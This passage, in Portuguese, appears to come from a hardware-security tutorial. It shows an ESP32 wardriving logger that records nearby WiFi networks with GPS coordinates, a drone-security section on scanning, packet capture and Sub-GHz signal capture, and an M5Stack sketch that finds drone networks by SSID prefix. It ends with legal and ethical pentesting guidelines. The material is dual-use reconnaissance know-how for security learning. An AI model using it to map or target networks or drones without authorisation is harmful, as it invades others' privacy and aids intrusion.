            case WIFI_AUTH_WPA_PSK: encryptionType = "WPA_PSK"; break;
            case WIFI_AUTH_WPA2_PSK: encryptionType = "WPA2_PSK"; break;
            case WIFI_AUTH_WPA_WPA2_PSK: encryptionType = "WPA_WPA2_PSK"; break;
            case WIFI_AUTH_WPA2_ENTERPRISE: encryptionType = "WPA2_ENTERPRISE"; break;
            default: encryptionType = "Unknown";
          }
          
          logFile.print(WiFi.BSSIDstr(i)); logFile.print(",");
          logFile.print("\""); logFile.print(WiFi.SSID(i)); logFile.print("\",");
          logFile.print(WiFi.RSSI(i)); logFile.print(",");
          logFile.print(WiFi.channel(i)); logFile.print(",");
          logFile.print(encryptionType); logFile.print(",");
          logFile.print(currentLat, 6); logFile.print(",");
          logFile.print(currentLng, 6); logFile.print(",");
          logFile.print(gps.hdop.hdop()); logFile.print(",");
          logFile.print(gps.date.year()); logFile.print("-");
          logFile.print(gps.date.month()); logFile.print("-");
          logFile.print(gps.date.day()); logFile.print(",");
          logFile.print(gps.time.hour()); logFile.print(":");
          logFile.print(gps.time.minute()); logFile.print(":");
          logFile.println(gps.time.second());
        }
        logFile.flush();
      }
    }
    
    lastScanTime = millis();
  }
}

Drone Hacking

Combinando as capacidades do Flipper Zero e M5Stack, é possível criar uma plataforma para teste de segurança de drones.

# Projeto de Análise de Segurança de Drones

## Componentes necessários:
- Flipper Zero
- M5Stack com módulo WiFi
- Antena direcional (opcional, para maior alcance)

## Etapas para análise:
1. Escaneamento passivo:
   - Use o M5Stack para escanear e identificar redes WiFi do drone
   - Analise protocolos e frequências utilizadas (2.4GHz comum)
   - Registre endereços MAC e forças de sinal

2. Análise de protocolo:
   - Capture pacotes de comunicação usando modo monitor no ESP32
   - Identifique padrões de comunicação e comandos
   - Verifique se a comunicação é criptografada

3. Teste de controles RF:
   - Alguns drones usam frequências Sub-GHz para controle remoto
   - Use o Flipper Zero para analisar sinais em 433MHz ou 915MHz
   - Capture e analise sinais de controle quando disponíveis

4. Código de exemplo para escaneamento de drones (M5Stack):
   

// Muitos drones comerciais modernos usam protocolos criptografados

#include 
#include "WiFi.h"
#include "esp_wifi.h"


const char* droneSSIDs[] = {
  "DJI_", "Parrot_", "TELLO-", "Bebop_", "ANAFI_"
};

void setup() {
  M5.begin();
  M5.Lcd.fillScreen(BLACK);
  M5.Lcd.setCursor(0, 0);
  M5.Lcd.setTextColor(WHITE);
  M5.Lcd.setTextSize(2);
  M5.Lcd.println("Drone Scanner");
  
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  
  M5.Lcd.println("Pronto para escanear");
  M5.Lcd.println("Pressione A para iniciar");
}

void loop() {
  M5.update();
  
  if (M5.BtnA.wasPressed()) {
    M5.Lcd.fillScreen(BLACK);
    M5.Lcd.setCursor(0, 0);
    M5.Lcd.println("Escaneando drones...");
    
    int networks = WiFi.scanNetworks();
    int dronesFound = 0;
    
    if (networks == 0) {
      M5.Lcd.println("Nenhuma rede encontrada");
    } else {
      for (int i = 0; i < networks; i++) {
        String ssid = WiFi.SSID(i);
        bool isDrone = false;
        
        // Verificar se é uma rede de drone conhecida
        for (int j = 0; j < sizeof(droneSSIDs)/sizeof(droneSSIDs[0]); j++) {
          if (ssid.startsWith(droneSSIDs[j])) {
            isDrone = true;
            break;
          }
        }
        
        if (isDrone) {
          dronesFound++;
          M5.Lcd.printf("Drone: %s\n", ssid.c_str());
          M5.Lcd.printf("  RSSI: %d dBm\n", WiFi.RSSI(i));
          M5.Lcd.printf("  Canal: %d\n", WiFi.channel(i));
          M5.Lcd.printf("  MAC: %s\n", WiFi.BSSIDstr(i).c_str());
          M5.Lcd.println();
        }
      }
      
      M5.Lcd.printf("Total: %d drones\n", dronesFound);
    }
    
    WiFi.scanDelete();
  }
}

Considerações Legais e Éticas

O uso responsável destas ferramentas é essencial. Antes de utilizar o Flipper Zero, M5Stack ou qualquer dispositivo similar para testes de segurança, considere os seguintes pontos:

Aspectos Legais

  • Teste apenas em sistemas próprios ou com autorização explícita - Testar sistemas sem permissão é ilegal na maioria dos países
  • Interferência em frequências de rádio - Dispositivos Sub-GHz e WiFi estão sujeitos a regulamentações específicas em cada país
  • Clonagem de credenciais de acesso - A clonagem não autorizada de cartões de acesso pode violar leis criminais
  • Interrupção de serviços - Ataques de jamming ou deauth podem ser considerados sabotagem ou interferência ilegal

Diretrizes Éticas para Pentesting

  1. Obtenha autorização por escrito antes de realizar qualquer teste de segurança
  2. Defina o escopo claramente - quais sistemas podem ser testados e quais técnicas podem ser utilizadas
  3. Evite interrupções de serviço - considere o impacto de suas ações em sistemas em produção
  4. Documente suas ações - mantenha registros detalhados de todos os testes realizados
  5. Proteja dados sensíveis - se encontrar informações confidenciais, trate-as com responsabilidade
  6. Reporte vulnerabilidades responsavelmente - siga práticas de divulgação coordenada
  7. Respeite a privacidade - não capture ou analise dados pessoais sem necessidade

Uso Educacional e de Pesquisa

Para uso educacional e de pesquisa em segurança, considere estas práticas:

  • Crie ambientes de laboratório isolados para testes
  • Use dispositivos e redes dedicadas que não afetem sistemas de produção
  • Documente seus experimentos e compartilhe conhecimento de forma responsável
  • Colabore com comunidades de segurança para melhorar ferramentas e técnicas
  • Contribua com correções e melhorias para os projetos de código aberto

Enfoque Construtivo

Lembre-se que o objetivo principal destas ferramentas é melhorar a segurança, não comprometê-la. Use suas habilidades e conhecimentos para identificar vulnerabilidades que possam ser corrigidas, tornando os sistemas mais seguros para todos.
